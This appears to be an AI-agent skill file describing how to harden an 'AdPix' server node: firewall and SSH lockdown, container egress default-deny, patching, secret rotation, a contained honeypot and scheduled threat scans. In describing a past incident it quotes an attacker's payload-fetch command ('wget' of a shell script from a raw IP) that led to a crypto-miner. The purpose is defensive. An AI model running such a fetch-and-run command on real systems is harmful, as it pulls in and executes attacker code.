---
name: adpix-harden
description: Security-harden an AdPix node — close the wide-open dev-compose posture (datastores on 0.0.0.0, no firewall, SSH password auth), lock container egress with egress_lockdown, rotate exfiltrated secrets with secret_rotate, trap the freed attacker-magnet ports with a honeypot, and schedule threat_scan. Use after standing up/migrating a node, after an incident, or when asked to secure/audit a server. Tool-first over security_audit + harden_server + patch_system, wired for the specific AdPix gaps found in the field.
---

# AdPix node hardening

Prereq: read **adpix-devops**. Tools (load via ToolSearch): `security_audit`, `harden_server`, `patch_system`, `egress_lockdown`, `secret_rotate`, `honeypot`, `threat_scan`, `schedule_job`. Prefer these over raw `run_command`.

Field reality: AdPix nodes have repeatedly run the **dev compose** in prod → internal datastores published on `0.0.0.0`, ufw inactive, SSH password auth on, no fail2ban. That posture is what enabled the prod1 RCE→XMRig miner (see adpix-incident). Harden in order: firewall/SSH → loopback → egress → patch → rotate → trap.

## 1. Audit
`security_audit server=<name>`. Expect FAILs like:
- internal ports on all interfaces: redis 6379, minio 9000/9001, clickhouse 8123/9000/9009/9181/9234, console 3000, auth 9696, deploy-api 8686, varnish 8080.
- ufw inactive · SSH password auth enabled · fail2ban absent · pending security updates · high 24h brute-force count.

Optional baseline: `threat_scan server=<name>` (read-only) to confirm the box isn't already compromised before you lock it. COMPROMISED → stop and go to **adpix-incident** first.

## 2. Remediate (priority order)
1. **Firewall + SSH + fail2ban** — `harden_server` with firewall (allow only the SSH port [**1349** on prod nodes]/80/443), sshHardening (disable password auth — *confirm key login works first*), fail2ban, autoUpdates. Apply is `confirm:true`.
2. **Bind datastores to loopback** — switch the stack to `compose.prod.yaml` properly so redis/minio/clickhouse/postgres/console/auth are NOT published on `0.0.0.0`. Verify with `ss -ltnp` → only SSH/80/443 public. This also FREES the attacker-magnet ports for step 3 of the trap phase.
3. **Container egress lockdown** — `egress_lockdown server=<name>` (`action:report`, read-only) to see the DOCKER-USER posture, then `action:apply confirm:true`. Default-deny outbound with established/DNS/private+inter-container ranges auto-allowed, so intra-stack CH/PG/Redis/IdP traffic keeps working with no config. Pass `allowHosts:[…]` only for **external** hosts the app legitimately calls (registries gcr.io/ghcr.io, goproxy.golang.org, provider APIs like api.stripe.com, SMTP/Brevo) — resolved to IPs on the target. This neuters the payload-pull on RCE (IR 3.4: the web container ran `wget http://77.90.13.20/1.sh` because egress was wide open). Rules are **runtime-only, not reboot-persistent** — persist via the host firewall if wanted. Best applied at RUNTIME, after any source build finishes (a mid-build lockdown starves goproxy/gcr — see adpix-offline-build). Any incident C2 `iptables -I OUTPUT/DOCKER-USER -d <ip> -j DROP` blocks (from `quarantine`) coexist with this — don't `teardown` if you still need them.
4. **Patch** — `patch_system server=<name>`; reboot is `confirm:true`. Confirm unattended-upgrades active.
5. **Rotate secrets** — if the node was ever compromised or secrets were exfiltrated/handled in plaintext, rotate with `secret_rotate`. Dry-run first (`secret_rotate stack=<analytics|tagmanager|account> server=<name>`) to inventory + classify each `.env` key (values redacted). Then `scope:all confirm:true` rotates every auto-rotatable key (POSTGRES_PASSWORD + DATABASE_URL, REDIS_PASSWORD + REDIS_URL, and self-sourced app `*_SECRET`/API keys) — each value is generated AND applied on the target, so it never transits the MCP; `.env` is backed up and stateless consumers are health-gated on restart. Run it **per stack** on a co-hosted node. **Assisted/manual** (reported with exact steps, not auto-rotated): ClickHouse (`CLICKHOUSE_PASSWORD` + `ch_redeploy`), MinIO root/service creds, IdP signing key (new `kid` + redeploy auth → force global re-auth, IR 1.1), OIDC client secret, SMTP/Brevo.

## 3. Trap + monitor (proactive)
Once the real services are on loopback (2.2), the attacker-magnet ports are free — turn them into a tarpit.
- **Honeypot** — `honeypot server=<name> action=plan` shows which FREE attacker-magnet ports it would trap (telnet/ssh-alt/mysql/postgres/redis/mongo/elastic/http-admin — never a port a real service holds) and the isolation guarantees. Then `action=deploy confirm:true`. Fully contained: internal-only network (no egress, no route to real services), non-root, read-only rootfs, all caps dropped, no secrets — so any hit is a confirmed intruder that leads nowhere. Review with `honeypot action=report` (`block:true` DROPs the caught IPs on the host firewall). Egress-blocked prod node → relay `python:3.12-alpine` first (see adpix-offline-build / adpix-devops).
- **Schedule the hunt** — `schedule_job` to run `threat_scan` on a cadence (e.g. hourly): read-only compromise sweep carrying the prod1 XMRig IOCs, verdict CLEAN/SUSPICIOUS/COMPROMISED. COMPROMISED → **adpix-incident** (`quarantine`).

## 4. Verify
- `security_audit` → ports/firewall/SSH now PASS; fail2ban + ufw active.
- `ss -ltnp` → only SSH/80/443 public **plus the intended honeypot decoy ports** (those are supposed to look open — not a regression).
- `egress_lockdown action=report` → default-deny ACTIVE.
- `threat_scan` → CLEAN.

## Caveats
- Enabling ufw/sshHardening on a LIVE node: ensure the SSH port (1349) is allowed and key auth works before disabling passwords, or you lock out the MCP.
- Don't break the legitimate front door: 80/443 (caddy) + the SSH port stay open; the *.adpix.net data plane must stay reachable.
- `egress_lockdown` rules are runtime-only — re-`apply` after a reboot or persist them in the host firewall. Don't lock down mid source-build.
- Honeypot decoy ports will show as listening in the verify step — that's intentional; don't "fix" them.
- Co-hosting all stacks on one node = one blast radius; recommend splitting/relocating heavy or sensitive services (`service_relocate`) as a follow-up.

Related skills: **adpix-devops** (env map + gotchas, read first), **adpix-incident** (triage/contain a live compromise → hands back here), **adpix-host-migrate** (harden the fresh node after cutover), **adpix-offline-build** (relay images / restore egress during a build on the Google-blocked prod nodes).
